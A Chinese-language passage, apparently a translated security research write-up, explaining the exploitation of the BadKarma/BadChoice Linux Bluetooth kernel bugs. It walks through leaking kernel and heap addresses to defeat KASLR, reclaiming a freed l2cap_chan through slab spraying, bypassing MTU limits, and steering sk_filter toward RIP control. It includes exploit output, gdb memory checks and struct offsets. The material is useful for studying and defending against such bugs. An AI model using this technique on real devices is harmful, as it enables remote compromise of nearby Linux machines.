@@ -1,0 +1,159 @@
+### 泄漏内存布局
+现在我们已经有了构造堆的方法，为 _BadKarma_ 攻击做好了准备。因此，可以完全控制 `sk_filter`
+指针。问题是，我们应该把它指向哪里？为了使这个原语有用，我们必须将它指向一个我们可以控制其内容的内存地址。这就是 _BadChoice_
+漏洞发挥作用的地方。这个漏洞有可能揭示内存布局，并帮助我们实现控制已知地址的内存块的目标。
+如前所述，为了利用未初始化的堆栈变量 bug，我们必须首先发送一些不同的命令，用有趣的数据填充栈帧(例如指向堆的指针或与 ROP 链相关的 .text
+段)。然后，我们可以发送存在漏洞的命令来接收数据。
+通过尝试一些随机的 L2CAP 命令，我们可以观察到，如果事先不使用任何特殊命令就触发 BadChoice，那么指向内核镜像的 .text
+段指针就会被泄漏。此外，通过发送 `L2CAP_CONF_RSP` 并尝试事先将 A2MP
+通道重新配置到`L2CAP_MODE_ERTM`，可以泄漏偏移量为 0x110 的结构 `l2cap_chan` 对象的地址。该对象的大小为 792
+字节，在 kmalloc-1024 slab 中被分配。
+    // pahole -E -C l2cap_chan --hex bluetooth.ko
+    struct l2cap_chan {
+        ...
+        struct delayed_work {
+            struct work_struct {
+                /* typedef atomic_long_t -> atomic64_t */ struct {
+                    /* typedef s64 -> __s64 */ long long int counter;        /* 0x110   0x8 */
+                } data; /* 0x110   0x8 */
+                ...
+            } work; /* 0x110  0x20 */
+            ...
+        } chan_timer; /* 0x110  0x58 */
+        ...
+        /* size: 792, cachelines: 13, members: 87 */
+        /* sum members: 774, holes: 9, sum holes: 18 */
+        /* paddings: 4, sum paddings: 16 */
+        /* last cacheline: 24 bytes */
+    };
+这个对象属于A2MP通道，可以通过破坏信道来释放它。这是很有用的，因为它允许我们在 UAF 攻击时应用相同的策略。
+考虑以下技巧：
+  1. 泄漏 `struct l2cap_chan` 对象的地址。
+  2. 通过销毁 A2MP 信道来释放 `struct l2cap_chan` 对象。
+  3. 重连 A2MP 信道，并且用堆原语喷射 kmalloc-1024 slab。
+  4. 它可能会回收前一个 `struct l2cap_chan` 对象的地址。
+换句话说，属于 `struct l2cap_chan` 的地址现在可能属于我们了！虽然所使用的技术非常基础，但在跑有 SLUB 分配器的 Ubuntu
+上可以非常可靠地工作。一个值得担忧的问题是，当重新连接 A2MP 信道时，之前的 `struct l2cap_chan` 可能会在堆喷射回收位置之前被新的
+`struct l2cap_chan` 重新占用。如果是这种情况，可以使用多个连接，即使另一个连接已经关闭，也有能力继续喷射。
+注意，在 kmalloc-1024 slab 中分配对象比在 kmalloc-128 slab 中分配对象要复杂一些，因为:
+  * ACL MTU 通常小于 1024 字节（可以用 hciconfig 检查）。
+  * A2MP 信道的默认 MTU 值是 `L2CAP_A2MP_DEFAULT_MTU=670` 字节。
+这两个 MTU 限制都很容易绕过。也就是说，我们可以通过将请求分割成多个 L2CAP 报文来绕过 ACL MTU 并且我们可以通过发送
+`L2CAP_CONF_MTU` 响应并将其配置为 0xffff 字节来绕过 A2MP
+MTU。同样，如果没有发送请求，蓝牙规范为什么没有明确禁止解析配置响应?
+让我们尝试一下这个技巧：
+    $ gcc -o exploit exploit.c -lbluetooth && sudo ./exploit XX:XX:XX:XX:XX:XX
+    [*] Opening hci device...
+    [*] Connecting to victim...
+    [+] HCI handle: 100
+    [*] Connecting A2MP channel...
+    [*] Leaking A2MP kernel stack memory...
+    [+] Kernel address: ffffffffad2001a4
+    [+] KASLR offset: 2b600000
+    [*] Preparing to leak l2cap_chan address...
+    [*] Leaking A2MP kernel stack memory...
+    [+] l2cap_chan address: ffff98ee5c62fc00
+    [*] Spraying kmalloc-1024...
+请注意两个泄漏的指针的最重要字节的不同之处。通过观察较高的字节，我们可以做出有根据的猜测(或查阅 Linux
+文档)，以确定它们是属于一个段、堆还是栈。为了确认我们确实能够回收 `struct l2cap_chan`
+的地址，我们可以使用以下命令检查受害者机器上的内存：
+    $ sudo gdb /boot/vmlinuz /proc/kcore
+    (gdb) x/40gx 0xffff98ee5c62fc00
+    0xffff98ee5c62fc00: 0x4141414141414141  0x4242424242424242
+    0xffff98ee5c62fc10: 0x4343434343434343  0x4444444444444444
+    0xffff98ee5c62fc20: 0x4545454545454545  0x4646464646464646
+    0xffff98ee5c62fc30: 0x4747474747474747  0x4848484848484848
+    ...
+    0xffff98ee5c62fd00: 0x6161616161616161  0x6262626262626262
+    0xffff98ee5c62fd10: 0x6363636363636363  0x6464646464646464
+    0xffff98ee5c62fd20: 0x6565656565656565  0x6666666666666666
+    0xffff98ee5c62fd30: 0x6767676767676767  0x6868686868686868
+内存内容看起来非常有希望！请注意，使用一个模式去喷射是很有用的，因为它允许我们立即识别内存块，并了解当出现 panic 错误时，哪些偏移量被取消引用。
+### 把它们都放在一起
+我们现在有了完成 RCE 所需的所有原语：
+  1. 我们可以控制一个地址已知的内存块（称为“有效载荷”）。
+  2. 我们可以泄漏一个 .text 段指针，并构建一个 ROP 链，我们可以将其存储在有效负载中。
+  3. 我们可以完全控制 `sk_filter` 字段，并将其指向我们的有效载荷。
+#### 实现 RIP 控制
+让我们回顾一下 `sk_filter_trim_cap()`，并理解为什么控制 `sk_filter` 是有益的。
+    // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/net/core/filter.c
+    int sk_filter_trim_cap(struct sock *sk, struct sk_buff *skb, unsigned int cap)
+    {
+        ...
+        rcu_read_lock();
+        filter = rcu_dereference(sk->sk_filter);
+        if (filter) {
+            struct sock *save_sk = skb->sk;
+            unsigned int pkt_len;
+            skb->sk = sk;
+            pkt_len = bpf_prog_run_save_cb(filter->prog, skb);
+            skb->sk = save_sk;
+            err = pkt_len ? pskb_trim(skb, max(cap, pkt_len)) : -EPERM;
+        }
+        rcu_read_unlock();
+        return err;
+    }
+由于我们控制 `filter` 的值，我们也可以通过在负载中偏移量 0x18 处放置指针来控制 `filter->prog`。也就是说，这是 `prog`
+的偏移量：
+    // pahole -E -C sk_filter --hex bluetooth.ko
+    struct sk_filter {
+        ...
+        struct bpf_prog *          prog;                                                 /*  0x18   0x8 */
+        /* size: 32, cachelines: 1, members: 3 */
+        /* sum members: 28, holes: 1, sum holes: 4 */
+        /* forced alignments: 1, forced holes: 1, sum forced holes: 4 */
+        /* last cacheline: 32 bytes */
+    } __attribute__((__aligned__(8)));
+`struct buf_prog` 的结构是：
+    // pahole -E -C bpf_prog --hex bluetooth.ko
+    struct bpf_prog {
+        ...
+        unsigned int               (*bpf_func)(const void  *, const struct bpf_insn  *); /*  0x30   0x8 */
+        union {
+            ...
+            struct bpf_insn {
+                /* typedef __u8 */ unsigned char code;                           /*  0x38   0x1 */
+                /* typedef __u8 */ unsigned char dst_reg:4;                      /*  0x39: 0 0x1 */
+                /* typedef __u8 */ unsigned char src_reg:4;                      /*  0x39:0x4 0x1 */
+                /* typedef __s16 */ short int  off;                              /*  0x3a   0x2 */
+                /* typedef __s32 */ int        imm;                              /*  0x3c   0x4 */
+            } insnsi[0]; /*  0x38     0 */
+        };                                                                               /*  0x38     0 */
+        /* size: 56, cachelines: 1, members: 20 */
+        /* sum members: 50, holes: 1, sum holes: 4 */
+        /* sum bitfield members: 10 bits, bit holes: 1, sum bit holes: 6 bits */
+        /* last cacheline: 56 bytes */
+    };
+函数 `bpf_prog_run_save_cb()` 将 `filter->prog` 传递给 `BPF_PROG_RUN()` ：
+    // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/filter.h
+    static inline u32 __bpf_prog_run_save_cb(const struct bpf_prog *prog,
+                         struct sk_buff *skb)
+    {
+        ...
+        res = BPF_PROG_RUN(prog, skb);
+        ...
+        return res;
+    }
+    static inline u32 bpf_prog_run_save_cb(const struct bpf_prog *prog,
+                           struct sk_buff *skb)
+    {
+        u32 res;
+        migrate_disable();
+        res = __bpf_prog_run_save_cb(prog, skb);
+        migrate_enable();
+        return res;
+    }
+然后用 `ctx`、`prog->insnsi` 和 `prog->bpf_func()` 作为参数调用
+`bpf_dispatcher_nop_func()` ：
+    // https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/tree/include/linux/filter.h
+    #define __BPF_PROG_RUN(prog, ctx, dfunc)    ({          \
+        u32 ret;                            \
+        cant_migrate();                         \
+        if (static_branch_unlikely(&bpf_stats_enabled_key)) {       \
+            ...
+            ret = dfunc(ctx, (prog)->insnsi, (prog)->bpf_func); \
+            ...
+        } else {                            \
+            ret = dfunc(ctx, (prog)->insnsi, (prog)->bpf_func); \
+        }                               \
+        ret; })
